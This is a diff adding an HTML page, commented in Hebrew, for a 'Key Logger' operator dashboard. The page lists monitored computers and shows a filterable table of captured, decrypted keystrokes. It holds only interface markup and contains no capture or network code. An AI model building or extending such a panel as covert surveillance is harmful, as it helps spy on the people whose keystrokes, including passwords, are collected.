@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Key Logger</title>
+    <link rel="icon" href="data:,">
+    <!-- טעינת קובץ העיצוב הראשי -->
+    <link rel="stylesheet" href="../static/css/style.css">
+    <style>
+        /* דוגמה להגדרות המחלקה "hidden" ב-CSS */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>The Key Logger</h1>
+        <!-- קבוצת כפתורי ניווט -->
+        <div class="nav-buttons">
+            <a href="/user_management" class="nav-link1">ניהול משתמשים</a>
+            <button id="disconnect-button" class="nav-link1 disconnect-button">ניתוק</button>
+            <!-- כפתור לסגירת הנתונים - יוצג רק בעת הצגת נתונים -->
+            <button id="close-data-button" class="nav-link1 hidden">סגור נתונים</button>
+        </div>
+
+        <!-- מרווח אופציונלי -->
+        <div class="spacer" style="margin-top: 100px;"></div>
+
+        <!-- סקשן להצגת רשימת המחשבים -->
+        <section aria-label="Computers List Section">
+            <div class="button_list">
+                <button onclick="toggleComputersList()">Show Computers</button>
+                <div id="computers_section" class="hidden">
+                    <h2>Computers List</h2>
+                    <div id="computer_list" class="computer-container"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- סקשן לסינון טבלה -->
+        <section id="filter_section" class="hidden" aria-label="Filter Section">
+            <h2>Filter Table</h2>
+            <input type="text" id="search-input" placeholder="Search in table..." onkeyup="filterTable()" aria-label="Search in table"/>
+            <label for="start-date">From:</label>
+            <input type="date" id="start-date" onchange="filterByDateTime()" aria-label="Start date">
+            <input type="time" id="start-time" onchange="filterByDateTime()" aria-label="Start time">
+            <label for="end-date">To:</label>
+            <input type="date" id="end-date" onchange="filterByDateTime()" aria-label="End date">
+            <input type="time" id="end-time" onchange="filterByDateTime()" aria-label="End time">
+            <label for="word-search">Search Words:</label>
+            <input type="text" id="word-search" placeholder="Enter search term" aria-label="Search words"/>
+        </section>
+
+        <!-- טבלת נתונים להצגת הקשות מהמקלדת -->
+        <div class="table">
+            <table id="data-table" class="hidden" border="1" aria-label="Keystroke Data Table">
+                <thead>
+                    <tr>
+                        <th>Year</th>
+                        <th>Month</th>
+                        <th>Day</th>
+                        <th>Hour</th>
+                        <th>Minute</th>
+                        <th>Decrypted Data</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+
+        <!-- תצוגת נתונים כטקסט -->
+        <div id="output" class="hidden" aria-live="polite"></div>
+
+        <!-- חלון מודאל לבחירת תצוגה -->
+        <div id="view-choice-modal" class="modal hidden" role="dialog" aria-labelledby="modal-title" aria-modal="true">
+            <div class="modal-content">
+                <h2 id="modal-title">בחר תצוגה</h2>
+                <p>בחר כיצד להציג את הנתונים:</p>
+                <button id="table-view-button">תצוגת טבלה</button>
+                <button id="text-view-button">תצוגת טקסט</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- טעינת קובץ ה-JS הראשי -->
+    <script src="../static/js/index.js" defer></script>
+</body>
+</html>
